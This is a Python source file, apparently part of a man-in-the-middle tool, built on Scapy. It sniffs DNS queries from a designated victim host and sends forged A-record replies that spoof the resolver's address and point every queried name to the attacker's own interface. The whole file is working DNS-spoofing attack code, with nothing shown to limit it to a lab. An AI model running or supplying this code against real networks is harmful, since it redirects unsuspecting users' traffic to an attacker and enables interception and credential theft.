from scapy.all import conf, sniff, IP, UDP, DNS, DNSRR, get_if_addr, send, ETH_P_ALL
from threading import Thread, Event

dev = "enp0s8"

class Sniffer(Thread):
    def  __init__(self, iface, victim):
        super(Sniffer, self).__init__()

        self.socket = None
        self.daemon = True
        self.iface = iface
        self.victim = victim
        self.stop_sniffer = Event()

    def run(self):
        self.socket = conf.L2listen(
            type=ETH_P_ALL,
            iface=self.iface,
            filter= "udp port 53 and src host " + self.victim.getIP()
        )

        sniff(
            opened_socket=self.socket,
            prn=self.print_packet,
            stop_filter=self.should_stop_sniffer
        )

    def join(self, timeout=None):
        self.stop_sniffer.set()
        super(Sniffer, self).join(timeout)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def print_packet(self, packet):
        ip = packet.getlayer(IP)
        udp = packet.getlayer(UDP)
        dns = packet.getlayer(DNS)

        # standard (a record) dns query
        if dns.qr == 0 and dns.opcode == 0:
            queried_host = dns.qd.qname[:-1].decode()
            resolved_ip = get_if_addr(dev)

            if resolved_ip:
                dns_answer = DNSRR(rrname=queried_host + ".",
                                        ttl=330,
                                        type="A",
                                        rclass="IN",
                                        rdata=resolved_ip)

                dns_reply = IP(src=ip.dst, dst=ip.src) / \
                            UDP(sport=udp.dport,
                                    dport=udp.sport) / \
                            DNS(
                                id = dns.id,
                                qr = 1,
                                aa = 0,
                                rcode = 0,
                                qd = dns.qd,
                                an = dns_answer
                            )

                print("Send %s has %s to %s" % (queried_host,
                                                resolved_ip,
                                                ip.src))
                send(dns_reply, iface=dev)